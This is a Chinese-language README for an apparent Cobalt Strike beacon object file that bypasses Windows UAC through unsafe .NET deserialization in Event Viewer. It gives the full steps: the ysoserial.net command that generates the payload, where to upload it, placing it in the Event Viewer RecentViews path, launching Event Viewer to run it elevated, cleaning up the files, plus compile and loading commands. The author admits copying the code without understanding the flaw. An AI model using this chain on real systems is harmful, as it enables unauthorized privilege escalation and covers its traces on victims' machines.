# EventViewerBypassUacBof
EventViewer Bypass Uac Bof

## 主要参考了如下作者的代码：
https://github.com/Octoberfest7/EventViewerUAC_BOF

https://github.com/netero1010/TrustedPath-UACBypass-BOF

https://github.com/CsEnox/EventViewer-UACBypass

其实不太清楚.net反序列化漏洞的原理，完全复制-粘贴。

## 执行流程
Bypass过程利用了Unsafe .Net Deserialization in Windows Event Viewer ，程序主要完成了如下流程：

1、使用ysoserial.net（https://github.com/pwntester/ysoserial.net）生成payload（.\ysoserial.exe -o base64 -f BinaryFormatter -g DataSet -c "forfiles /c C:\Users\test\Desktop\TESTdir\9999.exe" >b64.bin）

2、使用convertbin.py将payload转化为最终payload文件

3、上传payload文件至C:\Windows\Tasks\

4、拷贝文件并将文件命名为：%LOCALAPPDATA%\Microsoft\Event Viewer\RecentViews

5、启动EventViewer，这将导致EventViewer去执行payload文件

6、清理payload文件

## 使用方法：

1、编译：
x86_64-w64-mingw32-gcc -o EventViewerUAC.x64.o -c main2.c

2、CS加载 EventViewerUAC_gg.cna

3、EVUAC Payload Env （Env 通过执行 shell set |findstr \"LOCALAPPDATA\" 获得）
